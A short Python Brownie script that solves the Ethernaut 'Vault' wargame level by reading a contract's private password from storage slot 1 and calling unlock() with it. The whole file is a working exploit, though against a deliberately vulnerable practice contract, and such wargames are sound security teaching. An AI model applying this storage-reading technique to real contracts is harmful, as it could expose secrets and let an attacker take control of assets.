from lib2to3.pytree import convert
import brownie
from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert

ETHERNAUT_INSTANCE = "0xE19b93d2dF67E1Ac734645c54d1E75CEB208B6EF"


def main():

    player = get_account()
    print(f"Player = {player}")

    password = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 1)
    print(f"\nPassword = {password}\n")

    # locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
    # print(f"Vault is locked = {convert.to_bool(locked)}")

    vault = interface.VaultInterface(ETHERNAUT_INSTANCE)
    vault.unlock(password, {"from": player})

    # locked = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 0)
    # print(f"Vault is locked = {convert.to_bool(locked)}")
